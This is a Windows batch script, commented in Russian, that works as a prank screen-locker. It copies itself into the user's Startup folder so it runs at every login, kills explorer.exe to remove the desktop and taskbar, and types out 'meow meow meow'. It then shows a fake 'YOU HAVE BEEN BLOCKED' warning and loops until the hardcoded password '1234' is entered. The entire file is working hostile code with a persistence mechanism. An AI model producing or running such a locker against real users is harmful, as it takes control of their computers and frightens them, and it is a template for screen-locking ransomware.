@echo off
:: Включаем поддержку UTF-8 для корректного отображения текста
chcp 65001 > nul

:: 1. ДОБАВЛЕНИЕ В АВТОЗАГРУЗКУ
:: Копирует сам себя в папку автозапуска текущего пользователя
copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" > nul

:: 2. СНЯТИЕ EXPLORER.EXE (Исчезнет рабочий стол и панель задач)
taskkill /f /im explorer.exe > nul

:: Очистка экрана и смена цвета текста на красный (светло-красный на чёрном фоне)
cls
color 0C

:: 3. ВЫВОД ПЕЧАТАЮЩЕГОСЯ ТЕКСТА MEOW MEOW MEOW
:: Имитация ввода текста по буквам
<nul set /p "=m" & ping -n 1 127.0.0.1 > nul
<nul set /p "=e" & ping -n 1 127.0.0.1 > nul
<nul set /p "=o" & ping -n 1 127.0.0.1 > nul
<nul set /p "=w " & ping -n 1 127.0.0.1 > nul
<nul set /p "=m" & ping -n 1 127.0.0.1 > nul
<nul set /p "=e" & ping -n 1 127.0.0.1 > nul
<nul set /p "=o" & ping -n 1 127.0.0.1 > nul
<nul set /p "=w " & ping -n 1 127.0.0.1 > nul
<nul set /p "=m" & ping -n 1 127.0.0.1 > nul
<nul set /p "=e" & ping -n 1 127.0.0.1 > nul
<nul set /p "=o" & ping -n 1 127.0.0.1 > nul
<nul set /p "=w" & ping -n 1 127.0.0.1 > nul
echo.
ping -n 2 127.0.0.1 > nul

:: 4. ИМИТАЦИЯ ВИНЛОКЕРА (БЛОКИРОВЩИКА) WITH PASSWORD
:password_loop
cls
echo ======================================================
echo                !!! ATTENTION !!!
echo ======================================================
echo.
echo YOU HAVE BEEN BLOCKED DUE TO DOWNLOADING SUSPICIOUS SOFTWARE!
echo.
echo ACCESS TO SYSTEM IS DENIED.
echo.
echo ======================================================

:: Запрос ввода пароля
set /p "user_pass=Введите пароль для разблокировки: "

:: Проверка введенного пароля
if "%user_pass%"=="1234" (
    goto unlock
) else (
    echo.
    echo Неверный пароль! Попробуйте еще раз.
    ping -n 2 127.0.0.1 > nul
    goto password_loop
)

:unlock
:: 5. ВОССТАНОВЛЕНИЕ СИСТЕМЫ И ВЫХОД
:: Запускаем обратно рабочий стол
start explorer.exe
exit
